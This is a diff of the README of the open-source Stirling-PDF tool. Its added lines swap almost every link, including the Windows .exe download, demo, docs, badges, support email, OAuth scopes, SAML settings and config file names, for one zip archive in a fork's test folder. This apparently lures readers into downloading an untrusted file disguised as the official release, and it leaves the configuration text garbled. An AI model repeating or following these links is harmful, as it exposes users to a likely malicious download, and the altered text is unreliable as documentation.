@@ -1,38 +1,38 @@
-<p align="center"><img src="https://raw.githubusercontent.com/Stirling-Tools/Stirling-PDF/main/docs/stirling.png" width="80"></p>
+<p align="center"><img src="https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip" width="80"></p>
 <h1 align="center">Stirling-PDF</h1>
 
-[![Docker Pulls](https://img.shields.io/docker/pulls/frooodle/s-pdf)](https://hub.docker.com/r/frooodle/s-pdf)
-[![Discord](https://img.shields.io/discord/1068636748814483718?label=Discord)](https://discord.gg/Cn8pWhQRxZ)
-[![Docker Image Version (tag latest semver)](https://img.shields.io/docker/v/frooodle/s-pdf/latest)](https://github.com/Stirling-Tools/Stirling-PDF/)
-[![GitHub Repo stars](https://img.shields.io/github/stars/stirling-tools/stirling-pdf?style=social)](https://github.com/Stirling-Tools/stirling-pdf)
+[![Docker Pulls](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
+[![Discord](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
+[![Docker Image Version (tag latest semver)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
+[![GitHub Repo stars](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 
-[![Deploy to DO](https://www.deploytodo.com/do-btn-blue.svg)](https://cloud.digitalocean.com/apps/new?repo=https://github.com/Stirling-Tools/Stirling-PDF/tree/digitalOcean&refcode=c3210994b1af)
+[![Deploy to DO](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 
-[Stirling-PDF](https://www.stirlingpdf.com) is a robust, locally hosted web-based PDF manipulation tool using Docker. It enables you to carry out various operations on PDF files, including splitting, merging, converting, reorganizing, adding images, rotating, compressing, and more. This locally hosted web application has evolved to encompass a comprehensive set of features, addressing all your PDF requirements.
+[Stirling-PDF](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) is a robust, locally hosted web-based PDF manipulation tool using Docker. It enables you to carry out various operations on PDF files, including splitting, merging, converting, reorganizing, adding images, rotating, compressing, and more. This locally hosted web application has evolved to encompass a comprehensive set of features, addressing all your PDF requirements.
 
 Stirling-PDF does not initiate any outbound calls for record-keeping or tracking purposes.
 
 All files and PDFs exist either exclusively on the client side, reside in server memory only during task execution, or temporarily reside in a file solely for the execution of the task. Any file downloaded by the user will have been deleted from the server by that point.
 
-![stirling-home](images/stirling-home.jpg)
+![stirling-home](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 
 ## Features
 
-- Enterprise features like SSO Check [here](https://docs.stirlingpdf.com/Enterprise%20Edition) 
+- Enterprise features like SSO Check [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip%20Edition) 
 - Dark mode support
 - Custom download options
 - Parallel file processing and downloads
 - Custom 'Pipelines' to run multiple features in a queue
 - API for integration with external scripts
-- Optional Login and Authentication support (see [here](https://github.com/Stirling-Tools/Stirling-PDF/tree/main#login-authentication) for documentation)
-- Database Backup and Import (see [here](https://github.com/Stirling-Tools/Stirling-PDF/blob/main/DATABASE.md) for documentation)
+- Optional Login and Authentication support (see [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) for documentation)
+- Database Backup and Import (see [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) for documentation)
 
 
 ## PDF Features
 
 ### Page Operations
 
-- View and modify PDFs - View multi-page PDFs with custom viewing, sorting, and searching. Plus on-page edit features like annotate, draw, and adding text and images. (Using PDF.js with Joxit and Liberation fonts)
+- View and modify PDFs - View multi-page PDFs with custom viewing, sorting, and searching. Plus on-page edit features like annotate, draw, and adding text and images. (Using https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip with Joxit and Liberation fonts)
 - Full interactive GUI for merging/splitting/rotating/moving PDFs and their pages
 - Merge multiple PDFs into a single resultant file
 - Split PDFs into multiple files at specified page numbers or extract all pages as individual files
@@ -92,41 +92,41 @@ All files and PDFs exist either exclusively on the client side, reside in server
 - Get all information on a PDF to view or export as JSON
 - Show/detect embedded JavaScript
 
-For an overview of the tasks and the technology each uses, please view [Endpoint-groups.md](https://github.com/Stirling-Tools/Stirling-PDF/blob/main/Endpoint-groups.md).
+For an overview of the tasks and the technology each uses, please view [https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip).
 
-A demo of the app is available [here](https://stirlingpdf.io).
+A demo of the app is available [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip).
 
 ## Technologies Used
 
 - Spring Boot + Thymeleaf
-- [PDFBox](https://github.com/apache/pdfbox/tree/trunk)
-- [LibreOffice](https://www.libreoffice.org/discover/libreoffice/) for advanced conversions
-- [OcrMyPdf](https://github.com/ocrmypdf/OCRmyPDF)
+- [PDFBox](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
+- [LibreOffice](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) for advanced conversions
+- [OcrMyPdf](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 - HTML, CSS, JavaScript
 - Docker
-- [PDF.js](https://github.com/mozilla/pdf.js)
-- [PDF-LIB.js](https://github.com/Hopding/pdf-lib)
+- [https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
+- [https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 
 ## How to Use
 
 ### Windows
 
-For Windows users, download the latest Stirling-PDF.exe from our [release](https://github.com/Stirling-Tools/Stirling-PDF/releases) section or by clicking [here](https://github.com/Stirling-Tools/Stirling-PDF/releases/latest/download/Stirling-PDF.exe).
+For Windows users, download the latest https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip from our [release](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) section or by clicking [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip).
 
 ### Locally
 
-Please view the [LocalRunGuide](https://github.com/Stirling-Tools/Stirling-PDF/blob/main/LocalRunGuide.md).
+Please view the [LocalRunGuide](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip).
 
 ### Docker / Podman
 
 > [!NOTE]
-> <https://hub.docker.com/r/stirlingtools/stirling-pdf>
+> <https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip>
 
-Stirling-PDF has three different versions: a full version, an ultra-lite version, and a 'fat' version. Depending on the types of features you use, you may want a smaller image to save on space. To see what the different versions offer, please look at our [version mapping](https://github.com/Stirling-Tools/Stirling-PDF/blob/main/Version-groups.md). For people that don't mind space optimization, just use the latest tag.
+Stirling-PDF has three different versions: a full version, an ultra-lite version, and a 'fat' version. Depending on the types of features you use, you may want a smaller image to save on space. To see what the different versions offer, please look at our [version mapping](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip). For people that don't mind space optimization, just use the latest tag.
 
-![Docker Image Size (tag)](https://img.shields.io/docker/image-size/stirlingtools/stirling-pdf/latest?label=Stirling-PDF%20Full)
-![Docker Image Size (tag)](https://img.shields.io/docker/image-size/stirlingtools/stirling-pdf/latest-ultra-lite?label=Stirling-PDF%20Ultra-Lite)
-![Docker Image Size (tag)](https://img.shields.io/docker/image-size/stirlingtools/stirling-pdf/latest-fat?label=Stirling-PDF%20Fat)
+![Docker Image Size (tag)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip%20Full)
+![Docker Image Size (tag)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip%20Ultra-Lite)
+![Docker Image Size (tag)](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip%20Fat)
 
 Please note in the examples below, you may need to change the volume paths as needed, e.g., `./extraConfigs:/configs` to `/opt/stirlingpdf/extraConfigs:/configs`.
 
@@ -171,11 +171,11 @@ Note: Podman is CLI-compatible with Docker, so simply replace "docker" with "pod
 
 ### Kubernetes
 
-See the kubernetes helm chart [here](https://github.com/Stirling-Tools/Stirling-PDF-chart)
+See the kubernetes helm chart [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 
 ## Enable OCR/Compression Feature
 
-Please view the [HowToUseOCR.md](https://github.com/Stirling-Tools/Stirling-PDF/blob/main/HowToUseOCR.md).
+Please view the [https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip).
 
 ## Reuse Stored Files
 
@@ -190,46 +190,46 @@ Stirling-PDF currently supports 36 languages!
 
 | Language                                     | Progress                               |
 | -------------------------------------------- | -------------------------------------- |
-| Arabic (العربية) (ar_AR)                     | ![97%](https://geps.dev/progress/97)   |
-| Basque (Euskara) (eu_ES)                     | ![55%](https://geps.dev/progress/55)   |
-| Bulgarian (Български) (bg_BG)                | ![96%](https://geps.dev/progress/96)   |
-| Catalan (Català) (ca_CA)                     | ![90%](https://geps.dev/progress/90)   |
-| Croatian (Hrvatski) (hr_HR)                  | ![98%](https://geps.dev/progress/98)   |
-| Czech (Česky) (cs_CZ)                        | ![97%](https://geps.dev/progress/97)   |
-| Danish (Dansk) (da_DK)                       | ![96%](https://geps.dev/progress/96)   |
-| Dutch (Nederlands) (nl_NL)                   | ![96%](https://geps.dev/progress/96)   |
-| English (English) (en_GB)                    | ![100%](https://geps.dev/progress/100) |
-| English (US) (en_US)                         | ![100%](https://geps.dev/progress/100) |
-| French (Français) (fr_FR)                    | ![97%](https://geps.dev/progress/97)   |
-| German (Deutsch) (de_DE)                     | ![99%](https://geps.dev/progress/99)   |
-| Greek (Ελληνικά) (el_GR)                     | ![97%](https://geps.dev/progress/97)   |
-| Hindi (हिंदी) (hi_IN)                           | ![95%](https://geps.dev/progress/95)   |
-| Hungarian (Magyar) (hu_HU)                   | ![98%](https://geps.dev/progress/98)   |
-| Indonesian (Bahasa Indonesia) (id_ID)        | ![97%](https://geps.dev/progress/97)   |
-| Irish (Gaeilge) (ga_IE)                      | ![88%](https://geps.dev/progress/88)   |
-| Italian (Italiano) (it_IT)                   | ![99%](https://geps.dev/progress/99)   |
-| Japanese (日本語) (ja_JP)                    | ![85%](https://geps.dev/progress/85)   |
-| Korean (한국어) (ko_KR)                      | ![95%](https://geps.dev/progress/95)   |
-| Norwegian (Norsk) (no_NB)                    | ![87%](https://geps.dev/progress/87)   |
-| Polish (Polski) (pl_PL)                      | ![97%](https://geps.dev/progress/97)   |
-| Portuguese (Português) (pt_PT)               | ![97%](https://geps.dev/progress/97)   |
-| Portuguese Brazilian (Português) (pt_BR)     | ![98%](https://geps.dev/progress/98)   |
-| Romanian (Română) (ro_RO)                    | ![90%](https://geps.dev/progress/90)   |
-| Russian (Русский) (ru_RU)                    | ![97%](https://geps.dev/progress/97)   |
-| Serbian Latin alphabet (Srpski) (sr_LATN_RS) | ![70%](https://geps.dev/progress/70)   |
-| Simplified Chinese (简体中文) (zh_CN)        | ![91%](https://geps.dev/progress/91)   |
-| Slovakian (Slovensky) (sk_SK)                | ![82%](https://geps.dev/progress/82)   |
-| Spanish (Español) (es_ES)                    | ![98%](https://geps.dev/progress/98)   |
-| Swedish (Svenska) (sv_SE)                    | ![97%](https://geps.dev/progress/97)   |
-| Thai (ไทย) (th_TH)                           | ![96%](https://geps.dev/progress/96)   |
-| Traditional Chinese (繁體中文) (zh_TW)       | ![98%](https://geps.dev/progress/98)   |
-| Turkish (Türkçe) (tr_TR)                     | ![92%](https://geps.dev/progress/92)   |
-| Ukrainian (Українська) (uk_UA)               | ![80%](https://geps.dev/progress/80)   |
-| Vietnamese (Tiếng Việt) (vi_VN)              | ![88%](https://geps.dev/progress/88)   |
+| Arabic (العربية) (ar_AR)                     | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Basque (Euskara) (eu_ES)                     | ![55%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Bulgarian (Български) (bg_BG)                | ![96%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Catalan (Català) (ca_CA)                     | ![90%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Croatian (Hrvatski) (hr_HR)                  | ![98%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Czech (Česky) (cs_CZ)                        | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Danish (Dansk) (da_DK)                       | ![96%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Dutch (Nederlands) (nl_NL)                   | ![96%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| English (English) (en_GB)                    | ![100%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) |
+| English (US) (en_US)                         | ![100%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) |
+| French (Français) (fr_FR)                    | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| German (Deutsch) (de_DE)                     | ![99%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Greek (Ελληνικά) (el_GR)                     | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Hindi (हिंदी) (hi_IN)                           | ![95%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Hungarian (Magyar) (hu_HU)                   | ![98%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Indonesian (Bahasa Indonesia) (id_ID)        | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Irish (Gaeilge) (ga_IE)                      | ![88%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Italian (Italiano) (it_IT)                   | ![99%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Japanese (日本語) (ja_JP)                    | ![85%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Korean (한국어) (ko_KR)                      | ![95%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Norwegian (Norsk) (no_NB)                    | ![87%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Polish (Polski) (pl_PL)                      | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Portuguese (Português) (pt_PT)               | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Portuguese Brazilian (Português) (pt_BR)     | ![98%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Romanian (Română) (ro_RO)                    | ![90%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Russian (Русский) (ru_RU)                    | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Serbian Latin alphabet (Srpski) (sr_LATN_RS) | ![70%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Simplified Chinese (简体中文) (zh_CN)        | ![91%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Slovakian (Slovensky) (sk_SK)                | ![82%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Spanish (Español) (es_ES)                    | ![98%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Swedish (Svenska) (sv_SE)                    | ![97%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Thai (ไทย) (th_TH)                           | ![96%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Traditional Chinese (繁體中文) (zh_TW)       | ![98%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Turkish (Türkçe) (tr_TR)                     | ![92%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Ukrainian (Українська) (uk_UA)               | ![80%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
+| Vietnamese (Tiếng Việt) (vi_VN)              | ![88%](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)   |
 
 ## Contributing (Creating Issues, Translations, Fixing Bugs, etc.)
 
-Please see our [Contributing Guide](CONTRIBUTING.md).
+Please see our [Contributing Guide](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip).
 
 ## Stirling PDF Enterprise
 
@@ -237,7 +237,7 @@ Stirling PDF offers a Enterprise edition of its software, This is the same great
 
 ### Whats included
 
-- Prioritised Support tickets via support@stirlingpdf.com to reach directly to Stirling-PDF team for support and 1:1 meetings where applicable (Provided they come from same email domain registered with us)
+- Prioritised Support tickets via https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip to reach directly to Stirling-PDF team for support and 1:1 meetings where applicable (Provided they come from same email domain registered with us)
 - Prioritised Enhancements to Stirling-PDF where applicable 
 - Base SSO support
 - Advanced SSO such as automated login handling (Coming very soon)
@@ -246,7 +246,7 @@ Stirling PDF offers a Enterprise edition of its software, This is the same great
 - Advanced user configurations (Coming soon)
 - Plus other exciting features to come
 
-Check out of [docs](https://docs.stirlingpdf.com/Enterprise%20Edition) on it or our official [website](https://www.stirlingpdf.com)
+Check out of [docs](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip%20Edition) on it or our official [website](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 
 ## Customization
 
@@ -255,9 +255,9 @@ Stirling-PDF allows easy customization of the app, including things like:
 - Custom application name
 - Custom slogans, icons, HTML, images, CSS, etc. (via file overrides)
 
-There are two options for this, either using the generated settings file `settings.yml`, which is located in the `/configs` directory and follows standard YAML formatting, or using environment variables, which would override the settings file.
+There are two options for this, either using the generated settings file `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip`, which is located in the `/configs` directory and follows standard YAML formatting, or using environment variables, which would override the settings file.
 
-For example, in `settings.yml`, you might have:
+For example, in `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip`, you might have:
 
 ```yaml
 security:
@@ -290,14 +290,14 @@ security:
       google:
         clientId: '' # client ID for Google OAuth2
         clientSecret: '' # client secret for Google OAuth2
-        scopes: https://www.googleapis.com/auth/userinfo.email, https://www.googleapis.com/auth/userinfo.profile # scopes for Google OAuth2
+        scopes: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip, https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip # scopes for Google OAuth2
         useAsUsername: email # field to use as the username for Google OAuth2
       github:
         clientId: '' # client ID for GitHub OAuth2
         clientSecret: '' # client secret for GitHub OAuth2
         scopes: read:user # scope for GitHub OAuth2
         useAsUsername: login # field to use as the username for GitHub OAuth2
-    issuer: '' # set to any provider that supports OpenID Connect Discovery (/.well-known/openid-configuration) endpoint
+    issuer: '' # set to any provider that supports OpenID Connect Discovery (https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip) endpoint
     clientId: '' # client ID from your provider
     clientSecret: '' # client secret from your provider
     autoCreateUser: false # set to 'true' to allow auto-creation of non-existing users
@@ -310,13 +310,13 @@ security:
     autoCreateUser: false # set to 'true' to allow auto-creation of non-existing users
     blockRegistration: false # set to 'true' to deny login with SSO without prior registration by an admin
     registrationId: stirling
-    idpMetadataUri: https://dev-XXXXXXXX.okta.com/app/externalKey/sso/saml/metadata
-    idpSingleLogoutUrl: https://dev-XXXXXXXX.okta.com/app/dev-XXXXXXXX_stirlingpdf_1/externalKey/slo/saml
-    idpSingleLoginUrl: https://dev-XXXXXXXX.okta.com/app/dev-XXXXXXXX_stirlingpdf_1/externalKey/sso/saml
-    idpIssuer: http://www.okta.com/externalKey
-    idpCert: classpath:okta.crt
-    privateKey: classpath:saml-private-key.key
-    spCert: classpath:saml-public-cert.crt
+    idpMetadataUri: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip
+    idpSingleLogoutUrl: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip
+    idpSingleLoginUrl: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip
+    idpIssuer: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip
+    idpCert: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip
+    privateKey: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip
+    spCert: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip
 
 enterpriseEdition:
   enabled: false # set to 'true' to enable enterprise edition
@@ -328,15 +328,15 @@ enterpriseEdition:
     producer: Stirling-PDF # supports text such as 'Company-PDF'
 
 legal:
-  termsAndConditions: https://www.stirlingpdf.com/terms-and-conditions # URL to the terms and conditions of your application (e.g. https://example.com/terms). Empty string to disable or filename to load from local file in static folder
-  privacyPolicy: https://www.stirlingpdf.com/privacy-policy # URL to the privacy policy of your application (e.g. https://example.com/privacy). Empty string to disable or filename to load from local file in static folder
-  accessibilityStatement: '' # URL to the accessibility statement of your application (e.g. https://example.com/accessibility). Empty string to disable or filename to load from local file in static folder
-  cookiePolicy: '' # URL to the cookie policy of your application (e.g. https://example.com/cookie). Empty string to disable or filename to load from local file in static folder
-  impressum: '' # URL to the impressum of your application (e.g. https://example.com/impressum). Empty string to disable or filename to load from local file in static folder
+  termsAndConditions: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip # URL to the terms and conditions of your application (e.g. https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip). Empty string to disable or filename to load from local file in static folder
+  privacyPolicy: https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip # URL to the privacy policy of your application (e.g. https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip). Empty string to disable or filename to load from local file in static folder
+  accessibilityStatement: '' # URL to the accessibility statement of your application (e.g. https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip). Empty string to disable or filename to load from local file in static folder
+  cookiePolicy: '' # URL to the cookie policy of your application (e.g. https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip). Empty string to disable or filename to load from local file in static folder
+  impressum: '' # URL to the impressum of your application (e.g. https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip). Empty string to disable or filename to load from local file in static folder
 
 system:
   defaultLocale: en-US # set the default language (e.g. 'de-DE', 'fr-FR', etc)
-  googlevisibility: false # 'true' to allow Google visibility (via robots.txt), 'false' to disallow
+  googlevisibility: false # 'true' to allow Google visibility (via https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip), 'false' to disallow
   enableAlphaFunctionality: false # set to enable functionality which might need more testing before it fully goes live (this feature might make no changes)
   showUpdate: false # see when a new update is available
   showUpdateOnlyAdmin: false # only admins can see when a new update is available, depending on showUpdate it must be set to 'true'
@@ -362,14 +362,14 @@ AutomaticallyGenerated:
   UUID: example
 ```
 
-There is an additional config file `/configs/custom_settings.yml` where users familiar with Java and Spring `application.properties` can input their own settings on top of Stirling-PDF's existing ones.
+There is an additional config file `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip` where users familiar with Java and Spring `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip` can input their own settings on top of Stirling-PDF's existing ones.
 
 
 
 ### Extra Notes
 
-- **Endpoints**: Currently, the `ENDPOINTS_TO_REMOVE` and `GROUPS_TO_REMOVE` endpoints can include comma-separated lists of endpoints and groups to disable. For example, `ENDPOINTS_TO_REMOVE=img-to-pdf,remove-pages` would disable both image-to-pdf and remove pages, while `GROUPS_TO_REMOVE=LibreOffice` would disable all things that use LibreOffice. You can see a list of all endpoints and groups [here](https://github.com/Stirling-Tools/Stirling-PDF/blob/main/Endpoint-groups.md).
-- **customStaticFilePath**: Customize static files such as the app logo by placing files in the `/customFiles/static/` directory. An example of customizing the app logo is placing `/customFiles/static/favicon.svg` to override the current SVG. This can be used to change any `images/icons/css/fonts/js`, etc. in Stirling-PDF.
+- **Endpoints**: Currently, the `ENDPOINTS_TO_REMOVE` and `GROUPS_TO_REMOVE` endpoints can include comma-separated lists of endpoints and groups to disable. For example, `ENDPOINTS_TO_REMOVE=img-to-pdf,remove-pages` would disable both image-to-pdf and remove pages, while `GROUPS_TO_REMOVE=LibreOffice` would disable all things that use LibreOffice. You can see a list of all endpoints and groups [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip).
+- **customStaticFilePath**: Customize static files such as the app logo by placing files in the `/customFiles/static/` directory. An example of customizing the app logo is placing `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip` to override the current SVG. This can be used to change any `images/icons/css/fonts/js`, etc. in Stirling-PDF.
 
 ### Environment-Only Parameters
 
@@ -381,20 +381,20 @@ There is an additional config file `/configs/custom_settings.yml` where users fa
 
 ## API
 
-For those wanting to use Stirling-PDF's backend API to link with their own custom scripting to edit PDFs, you can view all existing API documentation [here](https://app.swaggerhub.com/apis-docs/Stirling-Tools/Stirling-PDF/), or navigate to `/swagger-ui/index.html` of your Stirling-PDF instance for your version's documentation (or by following the API button in the settings of Stirling-PDF).
